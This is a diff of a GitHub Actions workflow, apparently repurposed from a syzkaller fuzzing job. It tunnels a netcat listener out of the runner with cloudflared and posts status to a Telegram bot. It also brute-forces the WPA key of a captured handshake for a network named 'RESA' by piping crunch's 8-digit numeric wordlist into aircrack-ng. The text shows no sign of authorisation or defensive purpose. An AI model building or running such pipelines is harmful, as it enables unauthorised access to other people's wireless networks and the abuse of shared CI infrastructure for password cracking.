@@ -60,28 +60,10 @@ jobs:
           make install
 
 
-      - name: Buka tunnel ke web UI & listener nc
+      - name: Buka tunnel Listener nc
         run: |
           curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
           chmod +x cloudflared
-          nohup ./cloudflared tunnel --no-autoupdate --url http://127.0.0.1:56741 > tunnel.log 2>&1 &
-
-          URL=""
-          for i in $(seq 1 30); do
-            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel.log | head -1)
-            [ -n "$URL" ] && break
-            sleep 2
-          done
-
-          if [ -n "$URL" ]; then
-            MSG="[$RUN_ID] Syzkaller UI: $URL"
-          else
-            MSG="[$RUN_ID] Syzkaller publik url"
-          fi
-
-          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
-            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
-
 
           # nc listener
           nohup ./cloudflared tunnel --no-autoupdate --url tcp://127.0.0.1:20022 > tunnel-nc.log 2>&1 &
@@ -173,9 +155,8 @@ jobs:
             echo "############### fuzzzzzz"
             ls -la
 
-            crunch 8 8 1234567890 --stdout | timeout -s INT -k 2m 2m \
-              ./install/bin/aircrack-ng -w- mydata/resa.cap -e RESA || true
-
+            crunch 8 8 1234567890 --stdout | timeout -s INT -k 2m 30s \
+              ./install/bin/aircrack-ng -w- mydata/resa.cap -e RESA
 
             RES=$(cat .count || echo 0)
             MSG="[$RUN_ID] Done current: $RES"
